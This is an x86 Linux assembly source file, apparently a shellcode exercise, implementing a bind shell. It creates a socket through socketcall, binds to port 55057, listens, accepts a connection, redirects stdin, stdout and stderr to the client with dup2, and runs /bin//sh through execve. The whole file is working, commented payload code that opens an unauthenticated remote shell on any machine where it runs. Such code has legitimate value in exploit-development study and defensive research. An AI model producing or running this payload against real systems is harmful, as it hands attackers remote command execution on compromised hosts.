global _start

section .text

_start: 

	;storing arguments for socketcall syscall
	
	XOR eax, eax
	mov al, 0x66
	XOR ebx, ebx
	mov bl, 0x1

	;storing arguments for socket function call
	
	XOR edx, edx
	PUSH edx
	Push byte 1
	Push byte 2
	
	;storing arguments for socketcall syscall
	mov ecx, esp

	;Executing socketcall syscall

	int 0x80
	mov edi, eax ;storing return value i.e. sockfd in edi

	;storing arguments for socketcall syscall
	
	XOR eax, eax
	mov al, 0x66
	XOR ebx, ebx
	mov bl, 0x2
	
	;storing sockaddr_n structure on stack
	XOR edx, edx
	push edx
	push word 0x11d7 ; Port number to bind the shell on (present value binds on port 55057)
	push word 0x02

	;storing arguments for bind function call
	mov edx, esp
	push byte 16
	push edx
	push edi

	;storing arguments for socketcall syscall
	mov ecx, esp

	;Executing socketcall syscall

	int 0x80


	;storing arguments for socketcall syscall
	
	XOR eax, eax
	mov al, 0x66
	XOR ebx, ebx
	mov bl, 0x4

	;storing arguments for listen function call
	
	Push byte 1
	Push edi
	
	;storing arguments for socketcall syscall
	mov ecx, esp

	;Executing socketcall syscall

	int 0x80

	;storing arguments for socketcall syscall
	
	XOR eax, eax
	mov al, 0x66
	XOR ebx, ebx
	mov bl, 0x5

	;storing arguments for accept function call
	
	XOR EDX, EDX
	PUSH EDX
	PUSH EDX
	Push edi
	
	;storing arguments for socketcall syscall
	mov ecx, esp

	;Executing socketcall syscall

	int 0x80
	mov ebx, eax ; storing the return value i.e. client file descriptor in ebx

	;dup2 syscall - 3 times

	XOR ECX, ECX
	XOR EAX, EAX
	mov al, 0x3f
	int 0x80

	inc ecx
	XOR EAX, EAX
	mov al, 0x3f
	int 0x80

	inc ecx
	XOR EAX, EAX
	mov al, 0x3f
	int 0x80

	;execve syscall

	XOR EAX, EAX
	PUSH EAX
	PUSH 0x68732f2f
	PUSH 0x6e69622f
	MOV ebx, esp
	MOV ECX, EAX
	MOV EDX, EAX
	MOV al, 0xb
	int 0x80
